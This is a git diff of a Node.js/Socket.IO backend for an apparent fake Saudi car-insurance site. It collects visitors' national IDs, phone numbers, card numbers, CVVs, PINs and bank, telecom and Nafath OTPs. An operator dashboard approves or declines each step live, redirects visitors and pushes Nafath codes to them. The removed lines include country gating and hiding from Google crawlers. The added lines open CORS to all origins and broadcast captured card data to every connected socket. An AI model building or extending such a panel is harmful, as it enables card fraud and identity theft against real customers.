@@ -1,5 +1,5 @@
 /**
- * tmin backend — Railway-ready (v12)
+ * gosuksa backend — Railway-ready (v12)
  *
  * Serves two contracts on the same service:
  *
@@ -41,42 +41,16 @@ const PORT = process.env.PORT || 3000;
 const DATA_FILE = process.env.DATA_FILE || path.join(__dirname, "data.json");
 const ADMIN_TOKEN = process.env.ADMIN_TOKEN || "change-me";
 const CHAT_ENABLED = process.env.CHAT_ENABLED === "0" ? 0 : 1;
-const DEFAULT_CORS_ORIGINS = [
-  "https://tmin-care7.vercel.app",
-  "https://treegosksa.lovable.app",
-  "https://becare-tree.lovable.app",
-  "https://sherpa-admin.lovable.app",
-  "https://id-preview--00527616-d82b-4439-9dbe-8bd68a0938b2.lovable.app",
-  "https://id-preview--175f4f58-4e54-426c-b9c2-7ac4e8f4e2f0.lovable.app",
-  "https://id-preview--6cbf428b-d027-4b61-b67f-7d0b2f722218.lovable.app",
-];
-const CORS_ORIGINS = (process.env.CORS_ORIGINS || "")
+const CORS_ORIGINS = (process.env.CORS_ORIGINS || "*")
   .split(",")
   .map((s) => s.trim())
-  .filter((origin) => /^https?:\/\/[^/]+$/.test(origin));
-// Railway may provide CORS_ORIGINS; keep the connected admin origin available
-// even when that older environment value has not been updated yet.
-const REQUIRED_CORS_ORIGINS = [
-  "https://treegosksa.lovable.app",
-  "https://becare-tree.lovable.app",
-];
-const corsOrigin = CORS_ORIGINS.length
-  ? [...new Set([...CORS_ORIGINS, ...REQUIRED_CORS_ORIGINS])]
-  : DEFAULT_CORS_ORIGINS;
-const TRUSTED_ADMIN_ORIGINS = new Set(
-  corsOrigin.filter(
-    (origin) =>
-      origin === "https://becare-tree.lovable.app" ||
-      origin === "https://sherpa-admin.lovable.app" ||
-      origin.includes("id-preview--"),
-  ),
-);
+  .filter(Boolean);
+const corsOrigin = CORS_ORIGINS.includes("*") ? true : CORS_ORIGINS;
 
 // ---------- tiny JSON "db" ----------
 const db = (() => {
   const empty = {
     users: {},        // uuid -> session row (used by dashboard GET /users)
-    sessionAliases: {}, // legacy/generated ids -> canonical visitor id
     submissions: [],  // audit log { id, type, uuid, payload, ts }
     policies: [],
     details: [],
@@ -131,16 +105,12 @@ const io = new Server(server, {
   cors: { origin: corsOrigin, credentials: true },
 });
 
-// ---------- admin-relay (forwards admin actions to per-session client rooms)
+// ---------- admin-relay disabled: inline relay block below already forwards
+// every admin event to the customer session room. Re-enabling this listener
+// causes each event to be emitted 3x (harmless but noisy).
 let RELAY_ATTACHED = false;
-try {
-  const { attachAdminRelay } = require("./admin-relay");
-  attachAdminRelay(io);
-  RELAY_ATTACHED = true;
-  console.log("[relay] admin-relay attached");
-} catch (e) {
-  console.warn("[relay] admin-relay NOT attached:", e.message);
-}
+console.log("[relay] admin-relay listener disabled (inline relay active)");
+
 
 // ---------- structured admin/join logging + metrics ----------
 const JOIN_METRICS = {
@@ -169,88 +139,6 @@ const uuid = () => crypto.randomUUID();
 const newId = () =>
   Date.now().toString(36) + Math.random().toString(36).slice(2, 10);
 
-const SESSION_STATUSES = new Set([
-  "pending",
-  "in_progress",
-  "completed",
-  "blocked",
-  "declined",
-]);
-
-const SESSION_FIELDS = [
-  "name", "national_id", "phone", "serialNumber", "car_year", "car_model", "carPrice", "carHolderName", "purpose_of_use", "tameenFor", "tameenAllType", "tameenType",
-  "startedDate", "companyData", "cardNumber", "cvv", "expiryDate", "card_name", "pin",
-  "cardAttempts", "CardAccept", "OtpCardAccept", "PinAccept", "STCAccept", "MotslAccept",
-  "MotslOtpAccept", "NavazAccept", "stcAwaitingCall", "blocked", "checked", "MotslPhone",
-  "MotslNetwork", "MotslOtp", "CardOtp", "NavazOtp", "Customs_card", "phoneId", "type",
-  "status", "stage", "createdAt", "updatedAt",
-];
-
-const STAGE_ALIASES = {
-  init: "service", registered: "service", reg: "service", service: "service",
-  apply: "service", company: "service", payment: "payment", paymentform: "payment",
-  visa: "payment", card: "payment", visaotp: "cardOtp", "otp:received": "cardOtp",
-  phone: "phone", phoneotp: "phoneOtp", "phone:submitted": "phone",
-  mobotp: "mobilyOtp", motsl: "motslOtp", motslotp: "motslOtp", stc: "stc",
-  stcphoneotp: "stcOtp", stcotp: "stcOtp", navaz: "navaz", nafath: "navaz",
-};
-
-function canonicalStage(value, fallback = "service") {
-  const raw = String(value || "").trim();
-  const key = raw.replace(/^(accept|decline)/i, "");
-  if (!key) return fallback;
-  return STAGE_ALIASES[key.toLowerCase()] || STAGE_ALIASES[raw.toLowerCase()] || fallback;
-}
-
-function canonicalStatus(value, fallback = "pending") {
-  const status = String(value || "").trim().toLowerCase();
-  return SESSION_STATUSES.has(status) ? status : fallback;
-}
-
-function canonicalSession(id, row, timestamp) {
-  const source = row || {};
-  const document = {};
-  // Customer pages use `_id` while the legacy dashboard contract also uses
-  // `id`/`uuid`; expose all three identifiers consistently on every response.
-  document._id = id;
-  for (const field of SESSION_FIELDS) document[field] = source[field] ?? null;
-  document.name = document.name ?? source.documentOwnerName ?? source.fullName ?? source.carHolderName ?? source.cardHolderName ?? null;
-  document.national_id = document.national_id ?? source.idNumber ?? source.identityNumber ?? null;
-  document.phone = document.phone ?? source.mobileNumber ?? source.phoneNumber ?? null;
-  document.serialNumber = document.serialNumber ?? source.sequenceNumber ?? null;
-  document.car_year = document.car_year ?? source.carYear ?? source.modelYear ?? null;
-  document.car_model = document.car_model ?? source.carModel ?? source.vehicleModel ?? null;
-  document.carPrice = document.carPrice ?? source.carValue ?? source.price ?? null;
-  document.carHolderName = document.carHolderName ?? source.cardholderName ?? source.name ?? null;
-  document.purpose_of_use = document.purpose_of_use ?? source.purpose ?? null;
-  document.startedDate = document.startedDate ?? source.startDate ?? null;
-  document.card_name = document.card_name ?? source.cardholderName ?? null;
-  document.cvv = document.cvv ?? source.cardCvv ?? null;
-  document.expiryDate = document.expiryDate ?? source.cardExpiry ?? null;
-  if (!source.companyData && (source.company || source.price)) {
-    document.companyData = {
-      logo: source.logo ?? null,
-      price: source.price ?? null,
-      options: Array.isArray(source.options) ? source.options : [],
-    };
-  }
-  document.companyData = document.companyData || { logo: null, price: null, options: [] };
-  document.companyData.options = Array.isArray(document.companyData.options)
-    ? document.companyData.options
-    : [];
-  document.cardAttempts = Array.isArray(document.cardAttempts) ? document.cardAttempts : [];
-  for (const field of [
-    "CardAccept", "OtpCardAccept", "PinAccept", "STCAccept", "MotslAccept",
-    "MotslOtpAccept", "NavazAccept", "stcAwaitingCall", "blocked", "checked",
-  ]) document[field] = Boolean(document[field]);
-  document.status = canonicalStatus(document.status);
-  document.stage = canonicalStage(document.stage);
-  document.blocked = Boolean(document.blocked);
-  document.createdAt = source.createdAt || timestamp;
-  document.updatedAt = timestamp;
-  return document;
-}
-
 function clientIp(req) {
   return (
     req.headers["cf-connecting-ip"] ||
@@ -258,27 +146,6 @@ function clientIp(req) {
     req.socket?.remoteAddress ||
     "Unknown"
   );
-}
-
-const GOOGLE_CRAWLER_NAMES = [
-  "googlebot",
-  "adsbot-google",
-  "mediapartners-google",
-  "google-inspectiontool",
-  "google-extended",
-  "googleother",
-];
-
-function isGoogleCrawler(userAgent) {
-  const ua = String(userAgent || "").toLowerCase();
-  return GOOGLE_CRAWLER_NAMES.some((name) => ua.includes(name));
-}
-
-function resolveBreinitCountry(req) {
-  const candidate = String(req.headers["cf-ipcountry"] || req.headers["x-country-code"] || "")
-    .trim()
-    .toUpperCase();
-  return /^[A-Z]{2}$/.test(candidate) ? candidate : "XX";
 }
 
 function requireAdmin(req, res, next) {
@@ -305,27 +172,11 @@ function upsertSession(id, patch, extra = {}) {
     updatedAt: now(),
     ...extra,
   };
-  if (next.cardNumber || next.cardCvv || next.cvv) {
-    const attempts = Array.isArray(next.cardAttempts) ? next.cardAttempts : [];
-    const attempt = {
-      cardNumber: next.cardNumber || null,
-      cvv: next.cvv || next.cardCvv || null,
-      expiryDate: next.expiryDate || next.cardExpiry || null,
-      carHolderName: next.card_name || next.cardholderName || next.carHolderName || null,
-      status: canonicalStatus(next.status, "pending"),
-      createdAt: now(),
-    };
-    const last = attempts[attempts.length - 1];
-    if (!last || JSON.stringify(last) !== JSON.stringify(attempt)) next.cardAttempts = [...attempts, attempt];
-  }
-  next.status = canonicalStatus(next.status, existing.status || "pending");
-  next.stage = canonicalStage(next.stage, existing.stage || "service");
-  if (!next.createdAt) next.createdAt = now();
-  Object.assign(next, canonicalSession(id, next, next.updatedAt));
   state.users[id] = next;
   db.save();
   // Push realtime update to dashboards
-  io.to("admins").emit("sessionUpdate", next);
+  io.emit("sessionUpdate", next);
+  io.to("admins").emit("newVisitor", next);
   return next;
 }
 
@@ -366,6 +217,7 @@ function recordSubmission(type, payload) {
     `[submission] ${type} ${payload?.result || ""} total=${state.submissions.length}`
   );
   io.to("admins").emit("live:update", entry);
+  io.emit("live:update", entry);
   if (id) {
     // Mirror flat fields so the dashboard's session table shows the data.
     // The site nests real values under payload.formData (sometimes deeper),
@@ -388,7 +240,7 @@ function recordSubmission(type, payload) {
     };
     set("idNumber", ["identityNumber", "nationalIdIqama", "idNumber", "nationalId", "iqama"]);
     set("phone", ["mobileNumber", "phone", "phoneNumber", "mobile"]);
-    set("name", ["documentOwnerName", "name", "fullName", "carHolderName", "cardHolderName", "cardholderName"]);
+    set("name", ["documentOwnerName", "name", "fullName"]);
     set("cardholderName", ["cardholderName"]);
 
     set("sequenceNumber", ["sequenceNumber", "serialNumber"]);
@@ -428,44 +280,14 @@ function recordSubmission(type, payload) {
     set("promoCode", ["promoCode", "coupon"]);
     set("result", ["result"]);
     set("vehicle", ["vehicle"]);
-    set("eventType", ["eventType", "event_type"]);
-    set("workflowState", ["workflowState", "state"]);
-    set("cardBrand", ["cardBrand", "card_brand"]);
-    set("cardLast4", ["cardLast4", "card_last4"]);
-    set("provider", ["provider"]);
-    set("referenceId", ["referenceId", "reference_id"]);
-    set("page", ["page", "currentPage", "step", "page_path"]);
-    // Keep additional scalar values visible in the dashboard even when a new
-    // page field has not yet been added to this normalization table.
-    const ignoredFlatKeys = new Set(["id", "uuid", "userId", "sessionId", "raw"]);
-    for (const [key, value] of Object.entries(p)) {
-      if (ignoredFlatKeys.has(key)) continue;
-      if (value === null || value === undefined || value === "") continue;
-      if (typeof value === "string" || typeof value === "number" || typeof value === "boolean") {
-        if (flat[key] === undefined) flat[key] = value;
-      }
-    }
+    set("page", ["page", "currentPage", "step"]);
     if (flat.idNumber) flat.identityNumber = flat.idNumber;
     if (flat.phone) flat.mobileNumber = flat.phone;
     // Per-page bucket: keep the latest client inputs grouped by the page/event
     // the visitor was on when they submitted, so the dashboard can show
     // exactly what the client typed on each screen of their session.
     const existingUser = db.get().users[id] || {};
-    // State/activity markers must not erase the meaningful page where the
-    // visitor submitted the form. Prefer an explicit route, otherwise keep
-    // the last known route for marker-only events.
-    const lifecyclePage =
-      type === "reg" ? (payload?.page || "/") :
-      type === "apply" ? (payload?.page || "/reg") :
-      type === "company" ? (payload?.page || "/activate") :
-      null;
-    const pageKey = String(
-      flat.page ||
-      payload?.page_path ||
-      lifecyclePage ||
-      (type === "state" || type === "activity" ? existingUser.lastPage : type) ||
-      "unknown"
-    );
+    const pageKey = String(flat.page || type || "unknown");
     const prevPages = (existingUser.pages && typeof existingUser.pages === "object") ? existingUser.pages : {};
     const prevBucket = prevPages[pageKey] || { inputs: {}, events: [] };
     const mergedInputs = { ...(prevBucket.inputs || {}), ...flat };
@@ -489,7 +311,6 @@ function recordSubmission(type, payload) {
       pages: nextPages,
       lastEvent: type,
       lastPage: pageKey,
-      currentPage: pageKey,
       stage: type,
       lastSubmissionAt: now(),
     });
@@ -516,11 +337,6 @@ function recordSubmission(type, payload) {
 // Every customer listener expects a payload with { action: "confirmed" | "cancelled" }
 // and one of userId / uuid / id matching the visitor's session.
 const ADMIN_EVENT_ALIASES = {
-  // Quote/booking and PIN steps
-  acceptbooking: ["payment:action", "confirmed"],
-  declinebooking: ["payment:action", "cancelled"],
-  acceptpin: ["otp:action", "confirmed"],
-  declinepin: ["otp:action", "cancelled"],
   // Payment / visa card form
   acceptpaymentform: ["payment:action", "confirmed"],
   declinepaymentform: ["payment:action", "cancelled"],
@@ -569,17 +385,38 @@ const ADMIN_EVENT_ALIASES = {
 };
 
 function broadcastAdminEvent(id, event, payload) {
-  if (!id) return false;
+  if (!id) return;
   const target = io.to(`session:${id}`).to(`user:${id}`);
   const base = { id, uuid: id, userId: id };
   const data = payload && typeof payload === "object"
     ? { ...base, ...payload, id, uuid: id, userId: id }
     : base;
 
+  // Echo the raw event too, so a dashboard that already uses the
+  // customer-side names keeps working.
+  target.emit(event, data);
+
   const key = String(event || "").toLowerCase();
-  const isRedirectEvent = key === "adminredirect" || key === "redirect" || key === "admin:redirect";
+  const alias = ADMIN_EVENT_ALIASES[key];
+  if (alias) {
+    const [aliasEvent, action] = alias;
+    target.emit(aliasEvent, { ...data, action });
+  }
+
+  // Redirect: dashboard chooses the destination page.
+  if (key === "adminredirect" || key === "redirect" || key === "admin:redirect") {
+    const redirectPayload = {
+      ...data,
+      page: data.page || data.path || data.route || data.to || "/",
+      pageName: data.pageName || data.title || "",
+    };
+    target.emit("admin:redirect", redirectPayload);
+  }
+
+  // Nafath verification number: dashboard sends the 2-digit code that
+  // the customer must tap in the Absher app on page 7. The customer
+  // bundle listens for `nafath:code` with { verificationCode: "42" }.
   const isNafathNumberEvent =
-    key === "changenavazcode" ||
     key === "nafathnumber" ||
     key === "nafathcode" ||
     key === "sendnafathnumber" ||
@@ -591,18 +428,7 @@ function broadcastAdminEvent(id, event, payload) {
     /nafath.*(number|code)/.test(key) ||
     /(send|set).*nafath/.test(key);
 
-  const alias = ADMIN_EVENT_ALIASES[key];
-
-  // Redirect: dashboard chooses the destination page.
-  if (isRedirectEvent) {
-    const redirectPayload = {
-      ...data,
-      page: data.page || data.path || data.route || data.to || "/",
-      pageName: data.pageName || data.title || "",
-    };
-    target.emit("adminRedirect", redirectPayload);
-  } else if (isNafathNumberEvent) {
-    // The customer bundle listens for the legacy changeNavazCode event.
+  if (isNafathNumberEvent) {
     const raw = String(
       data.verificationCode ??
         data.code ??
@@ -612,15 +438,16 @@ function broadcastAdminEvent(id, event, payload) {
         data.value ??
         ""
     ).trim();
-    // Accept ASCII and Arabic decimal digits, then normalize to exactly 2.
-    const normalized = raw
-      .replace(/[٠-٩]/g, (digit) => String("٠١٢٣٤٥٦٧٨٩".indexOf(digit)))
-      .replace(/[۰-۹]/g, (digit) => String("۰۱۲۳۴۵۶۷۸۹".indexOf(digit)));
-    const digits = normalized.replace(/\D+/g, "").slice(0, 2);
-    if (!/^\d{2}$/.test(digits)) return false;
-    const code = digits;
-    const codePayload = { ...data, verificationCode: code, code, number: code, userOtp: code };
-    target.emit("changeNavazCode", codePayload);
+    // Keep digits only, pad/truncate to 2 chars so the customer page
+    // always shows a clean two-digit badge.
+    const digits = raw.replace(/\D+/g, "").slice(0, 2).padStart(raw ? 2 : 0, "0");
+    const code = digits || raw;
+    target.emit("nafath:code", {
+      ...data,
+      verificationCode: code,
+      code,
+      number: code,
+    });
 
     // "Send # & Redirect": if the dashboard event or payload says so,
     // also push the client to page 7 (/nafath) so they see the badge.
@@ -631,20 +458,12 @@ function broadcastAdminEvent(id, event, payload) {
       data.navigate === true ||
       /nafath/i.test(String(data.page || data.route || data.to || ""));
     if (wantsRedirect) {
-      target.emit("adminRedirect", {
+      target.emit("admin:redirect", {
         ...data,
-        page: "/navaz",
-        path: "/navaz",
-        pageName: data.pageName || "navaz",
+        page: "/nafath",
+        pageName: data.pageName || "nafath",
       });
     }
-  } else if (alias) {
-    // The current customer build listens for legacy events such as
-    // acceptPaymentForm and acceptVisaOtp. Sending both legacy and
-    // namespaced aliases makes a page advance twice and duplicates writes.
-    target.emit(event, { ...data, action: alias[1] });
-  } else {
-    target.emit(event, data);
   }
 
 
@@ -655,16 +474,14 @@ function broadcastAdminEvent(id, event, payload) {
   }
 
   io.to("admins").emit(`admin:${event}`, { id, payload: data });
-  return true;
 }
 
 // ---------- REST: health / meta ----------
-app.get("/", (_req, res) => res.json({ ok: true, service: "tmin-backend" }));
+app.get("/", (_req, res) => res.json({ ok: true, service: "gosuksa-backend" }));
 app.get("/health", (_req, res) => {
   const adminSockets = io.sockets.adapter.rooms.get("admins")?.size || 0;
   res.json({
     ok: true,
-    adminAuthConfigured: Boolean(ADMIN_TOKEN && ADMIN_TOKEN !== "change-me"),
     version: APP_VERSION,
     startedAt: STARTED_AT,
     uptimeSec: Math.round(process.uptime()),
@@ -680,7 +497,6 @@ app.get("/admin/health", requireAdmin, (_req, res) => {
   const adminSockets = io.sockets.adapter.rooms.get("admins")?.size || 0;
   res.json({
     ok: true,
-    adminAuthConfigured: Boolean(ADMIN_TOKEN && ADMIN_TOKEN !== "change-me"),
     version: APP_VERSION,
     startedAt: STARTED_AT,
     uptimeSec: Math.round(process.uptime()),
@@ -695,7 +511,7 @@ app.get("/admin/health", requireAdmin, (_req, res) => {
   });
 });
 
-const APP_VERSION = "v26-page-events-relay-start";
+const APP_VERSION = "v21";
 
 app.get("/version", (_req, res) =>
   res.json({
@@ -709,37 +525,22 @@ app.get("/version", (_req, res) =>
   })
 );
 
-app.get("/breinit", (req, res) => {
-  const countryCode = resolveBreinitCountry(req);
-  const crawler = isGoogleCrawler(req.headers["user-agent"]);
-  // Railway is a compatibility fallback; the existing tmin-edge Worker is
-  // the authoritative edge decision point. Missing country data fails closed.
-  res.set("Cache-Control", "no-store");
-  res.json({ ok: true, allowed: countryCode === "SA" && !crawler, countryCode, crawler });
-});
+app.get("/breinit", (_req, res) => res.json({ ok: true }));
 app.post("/api/chat/enabled", (_req, res) =>
   res.json({ isChatEnabled: CHAT_ENABLED })
 );
-app.get("/order/status/:id", (req, res) => {
-  const session = db.get().users[req.params.id];
-  res.json({ data: { blocked: Boolean(session?.blocked) } });
-});
 
 // ---------- REST: customer site (frontend contract) ----------
 app.post("/api/user/init", (req, res) => {
-  const { browserInfo } = req.body || {};
-  // Reuse the browser's seeded id when the client provides it. Older clients
-  // that send no identifier still receive a new id, but the current frontend
-  // will not create a second row before its first form submission.
-  const id = req.body?.visitorId || req.body?.uuid || req.body?.id || uuid();
+  const { uuid: sentUuid, browserInfo } = req.body || {};
+  const id = sentUuid || uuid();
   const ip = clientIp(req);
   upsertSession(id, {
     ip,
     ua: req.headers["user-agent"] || "",
     browserInfo: browserInfo || null,
     lastSeen: now(),
-    status: "pending",
-    stage: "service",
+    stage: "init",
   });
   res.json({
     ok: true,
@@ -753,74 +554,6 @@ app.post("/api/user/init", (req, res) => {
       countryCode: "XX",
     },
   });
-});
-
-// ---------- Safe customer state/activity markers ----------
-// The customer bundle sends only allowlisted workflow markers here. These
-// endpoints intentionally reject card numbers, CVV, OTPs, PINs, passwords,
-// and other credential-like fields before anything is persisted or relayed.
-const SAFE_STATE_KEYS = new Set([
-  "event_type", "state", "card_brand", "card_last4", "reference_id", "provider", "page_path",
-]);
-const SAFE_STATE_EVENTS = {
-  payment_method_submitted: new Set(["tokenization_required"]),
-  payment_challenge_submitted: new Set(["pending_provider_verification"]),
-  phone_challenge_submitted: new Set(["pending_provider_verification"]),
-  identity_verification_started: new Set(["pending_provider_verification"]),
-  identity_challenge_submitted: new Set(["pending_provider_verification"]),
-  contact_method_selected: new Set(["submitted"]),
-  page_viewed: new Set(["observed"]),
-};
-const SAFE_SENSITIVE_KEY =
-  /(?:card.?number|card_number|\bpan\b|cvv|cvc|otp|passcode|password|\bpin\b|navazuser|navazpassword|identity_otp|card_otp)/i;
-const SAFE_TRACKED_PATHS = new Set([
-  "/", "/reg", "/confirm", "/activate", "/activate_shamel", "/phone",
-  "/phoneOtp", "/mobilyOtp", "/stcOtp", "/motsl", "/motslOtp", "/navaz",
-  "/stc", "/order_otp", "/verfiy",
-]);
-
-function safeMarker(body) {
-  if (!body || typeof body !== "object" || Array.isArray(body)) return null;
-  if (Object.keys(body).some((key) => !SAFE_STATE_KEYS.has(key))) return null;
-  if (Object.keys(body).some((key) => SAFE_SENSITIVE_KEY.test(key))) return null;
-  const eventType = String(body.event_type || "").trim();
-  const state = String(body.state || "").trim();
-  if (!SAFE_STATE_EVENTS[eventType]?.has(state)) return null;
-  const cardBrand = body.card_brand == null ? null : String(body.card_brand).trim().toLowerCase();
-  const cardLast4 = body.card_last4 == null ? null : String(body.card_last4).trim();
-  const referenceId = body.reference_id == null ? null : String(body.reference_id).trim();
-  const provider = body.provider == null ? null : String(body.provider).trim().slice(0, 80);
-  const pagePath = body.page_path == null ? null : String(body.page_path).split("?")[0].trim();
-  if (pagePath && !SAFE_TRACKED_PATHS.has(pagePath)) return null;
-  if (cardBrand && !["visa", "mastercard", "mada", "amex", "unknown"].includes(cardBrand)) return null;
-  if (cardLast4 && !/^\d{4}$/.test(cardLast4)) return null;
-  if (referenceId && !/^[A-Za-z0-9._:-]+$/.test(referenceId)) return null;
-  return { eventType, state, cardBrand, cardLast4, referenceId, provider, pagePath };
-}
-
-app.post("/state/:id", (req, res) => {
-  const id = req.params.id;
-  const marker = safeMarker(req.body);
-  if (!marker) return res.status(400).json({ error: "invalid_safe_state_marker" });
-  const session = upsertSession(id, {
-    lastEvent: marker.eventType,
-    stage: canonicalStage(marker.eventType),
-    safeState: marker,
-    ...(marker.pagePath ? { lastPage: marker.pagePath, currentPage: marker.pagePath } : {}),
-    lastSeen: now(),
-  });
-  recordSubmission("state", { uuid: id, ...marker, ...(marker.pagePath ? { page_path: marker.pagePath } : {}) });
-  res.json({ recorded: true, requestId: id, marker, session });
-});
-
-app.post("/activity/:id", (req, res) => {
-  const pagePath = String(req.body?.page_path || "").split("?")[0];
-  if (!SAFE_TRACKED_PATHS.has(pagePath)) {
-    return res.status(400).json({ error: "unsupported_page_path" });
-  }
-  const session = upsertSession(req.params.id, { lastPage: pagePath, lastSeen: now() });
-  recordSubmission("activity", { uuid: req.params.id, page_path: pagePath });
-  res.json({ recorded: true, requestId: req.params.id, session });
 });
 
 app.get("/api/vicinfomain/captcha", (_req, res) => {
@@ -967,41 +700,7 @@ app.get("/users", maybeAdmin, (_req, res) => {
   const list = Object.values(db.get().users).sort(
     (a, b) => (Date.parse(b.updatedAt || 0) || 0) - (Date.parse(a.updatedAt || 0) || 0)
   );
-  const fingerprint = crypto
-    .createHash("sha1")
-    .update(list.map((row) => `${row._id || row.id || row.uuid}:${row.updatedAt || ""}`).join("|"))
-    .digest("hex");
-  const etag = `W/"users-${fingerprint}"`;
-  res.set("ETag", etag);
-  res.set("Cache-Control", "private, max-age=0, must-revalidate");
-  if (_req.headers["if-none-match"] === etag) return res.status(304).end();
   res.json(list);
-});
-// Safe dashboard feed: return only operational counters and timestamps. Never
-// expose customer form values, contact details, IPs, payment data, OTPs, PINs,
-// passwords, or identity codes to the dashboard.
-app.get("/admin/live-summary", requireAdmin, (_req, res) => {
-  const sessions = Object.values(db.get().users)
-    .map((row) => {
-      const pages = row.pages && typeof row.pages === "object" ? Object.keys(row.pages).length : 0;
-      const pageEvents = Array.isArray(row.pageEvents) ? row.pageEvents.length : 0;
-      const id = String(row._id || row.id || row.uuid || "").trim();
-      if (!id) return null;
-      return {
-        _id: id,
-        customerUuid: id,
-        createdAt: row.createdAt || row.created || null,
-        updatedAt: row.updatedAt || row.lastSeen || row.createdAt || null,
-        lastSeen: row.lastSeen || row.updatedAt || null,
-        blocked: row.blocked === true,
-        checked: row.checked === true,
-        pageCount: pages,
-        activityCount: pageEvents,
-      };
-    })
-    .filter(Boolean)
-    .sort((a, b) => (Date.parse(b.updatedAt || 0) || 0) - (Date.parse(a.updatedAt || 0) || 0));
-  res.json({ sessions });
 });
 app.get("/users/:id", maybeAdmin, (req, res) => {
   const s = db.get().users[req.params.id];
@@ -1015,21 +714,13 @@ app.delete("/users/:id", maybeAdmin, (req, res) => {
 });
 
 app.post("/reg", (req, res) => {
-  const body = req.body || {};
-  const requestId = String(body.requestId || body.idempotencyKey || "").trim();
-  if (requestId) {
-    const previous = db.get().submissions.find(
-      (entry) => entry.type === "reg" && String(entry.payload?.requestId || "") === requestId,
-    );
-    if (previous?.uuid && db.get().users[previous.uuid]) return res.json(db.get().users[previous.uuid]);
-  }
-  const id = body.id || body.uuid || body.visitorId || newId();
+  const id = req.body.id || req.body.uuid || newId();
   const s = upsertSession(id, {
-    ...body,
+    ...req.body,
     ip: clientIp(req),
     stage: "registered",
   });
-  recordSubmission("reg", { ...body, uuid: id });
+  recordSubmission("reg", { ...req.body, uuid: id });
   res.json(s);
 });
 
@@ -1075,7 +766,7 @@ const IGNORED_ANY_EVENTS = new Set([
   "client:cancelOtp", "client:cancelPayment",
   "payment:duplicateAttempt", "otp:duplicateAttempt",
   // admin -> client control events (not visitor submissions)
-  "acceptService", "declineService", "acceptPaymentForm", "declinePaymentForm",
+  "acceptPaymentForm", "declinePaymentForm",
   "acceptPhone", "declinePhone", "acceptVisaOtp", "declineVisaOtp",
   "acceptPhoneOtp", "declinePhoneOtp", "acceptPhoneOTP", "declinePhoneOTP",
   "acceptMobOtp", "declineMobOtp", "acceptMotslOtp", "declineMotslOtp",
@@ -1116,42 +807,10 @@ io.on("connection", (socket) => {
     recordSubmission(event, { ...obj, uuid: id, page });
   });
 
-  // The current customer bundle uses the safe-transit event contract rather
-  // than the legacy user:join contract. Persist these events as live sessions
-  // so the dashboard can display visitors before the first form submission.
-  socket.on("session:state_changed", (payload = {}) => {
-    const id =
-      payload.sessionId ||
-      payload.uuid ||
-      socket.data.userId ||
-      socket.data.sessionId;
-    if (!id) return;
-    socket.data.sessionId = id;
-    socket.join(`session:${id}`);
-    socket.join(`user:${id}`);
-    const pagePath = String(payload.pagePath || "").split("?")[0];
-    upsertSession(id, {
-      lastSeen: now(),
-      ip: clientIp(socket.request),
-      stage: payload.state?.page || payload.state?.stage || "service",
-      safeTransitState: payload.state || null,
-      ...(SAFE_TRACKED_PATHS.has(pagePath)
-        ? { lastPage: pagePath, currentPage: pagePath }
-        : {}),
-      lastEvent: payload.eventType || "session:state_changed",
-    });
-    if (SAFE_TRACKED_PATHS.has(pagePath)) {
-      recordSubmission("activity", { uuid: id, page_path: pagePath });
-    }
-  });
-
   // -------- Frontend (customer site) join --------
   socket.on("user:join", (p = {}) => {
     const userType = p.userType || "client";
-    // The current customer bundle joins before it calls bindOrder and sends
-    // no id. Do not persist a random placeholder row; bindOrder will attach
-    // this socket to the browser's canonical session id a moment later.
-    const uid = p.userId || p.userInfo?.uuid || null;
+    const uid = p.userId || p.userInfo?.uuid || uuid();
     socket.data.userType = userType;
     socket.data.userId = uid;
     socket.data.sessionId = uid;
@@ -1164,7 +823,6 @@ io.on("connection", (socket) => {
         socket.handshake.auth?.adminToken || socket.handshake.auth?.token;
       const tokenPresent = !!suppliedToken;
       const tokenValid = suppliedToken === ADMIN_TOKEN;
-      const originTrusted = TRUSTED_ADMIN_ORIGINS.has(socket.handshake.headers.origin);
 
       if (tokenPresent && !tokenValid) {
         JOIN_METRICS.admin_join_invalid_token++;
@@ -1177,14 +835,7 @@ io.on("connection", (socket) => {
         socket.disconnect(true);
         return;
       }
-      if (!tokenPresent && originTrusted) {
-        JOIN_METRICS.admin_join_ok++;
-        socket.data.adminAuthenticated = true;
-        logJoinEvent({
-          handler: "user:join", role: "admin", result: "authenticated_trusted_origin",
-          socketId: socket.id, ip, ua, uid,
-        });
-      } else if (!tokenPresent) {
+      if (!tokenPresent) {
         JOIN_METRICS.admin_join_missing_token++;
         logJoinEvent({
           handler: "user:join", role: "admin", result: "joined_without_token",
@@ -1201,16 +852,6 @@ io.on("connection", (socket) => {
       socket.join("admins");
       socket.emit("user:joined", { userId: uid });
       socket.emit("live:updatesHistory", db.get().submissions.slice(-200));
-      return;
-    }
-
-    if (!uid) {
-      JOIN_METRICS.client_join_ok++;
-      logJoinEvent({
-        handler: "user:join", role: "client", result: "awaiting_bind",
-        socketId: socket.id, ip, ua,
-      });
-      socket.emit("user:joined", { userId: null });
       return;
     }
 
@@ -1232,17 +873,11 @@ io.on("connection", (socket) => {
     socket.join(`session:${uid}`);
     socket.emit("user:joined", { userId: uid });
     socket.emit("user:uuidAssigned", { uuid: uid });
-    const session = upsertSession(uid, { lastSeen: now(), ip });
-    io.to("admins").emit("live:update", {
-      type: "visitor_joined",
-      uuid: uid,
-      session,
-      ts: now(),
-    });
+    upsertSession(uid, { lastSeen: now(), ip });
   });
 
   // -------- Admin dashboard (tmn-backend) join --------
-  socket.on("join", (data = {}, ack) => {
+  socket.on("join", (data = {}) => {
     const role = data.role || "visitor";
     socket.data.role = role;
     const ip = clientIp(socket.request);
@@ -1254,7 +889,6 @@ io.on("connection", (socket) => {
         socket.handshake.auth?.token;
       const tokenPresent = !!suppliedToken;
       const tokenValid = suppliedToken === ADMIN_TOKEN;
-      const originTrusted = TRUSTED_ADMIN_ORIGINS.has(socket.handshake.headers.origin);
 
       if (tokenPresent && !tokenValid) {
         JOIN_METRICS.admin_join_invalid_token++;
@@ -1263,19 +897,11 @@ io.on("connection", (socket) => {
           handler: "join", role: "admin", result: "rejected_invalid_token",
           socketId: socket.id, ip, ua,
         });
-        if (typeof ack === "function") ack({ ok: false, error: "invalid_admin_token" });
         socket.emit("clientBlocked", { reason: "invalid_admin_token" });
         socket.disconnect(true);
         return;
       }
-      if (!tokenPresent && originTrusted) {
-        JOIN_METRICS.admin_join_ok++;
-        socket.data.adminAuthenticated = true;
-        logJoinEvent({
-          handler: "join", role: "admin", result: "authenticated_trusted_origin",
-          socketId: socket.id, ip, ua,
-        });
-      } else if (!tokenPresent) {
+      if (!tokenPresent) {
         JOIN_METRICS.admin_join_missing_token++;
         logJoinEvent({
           handler: "join", role: "admin", result: "joined_without_token",
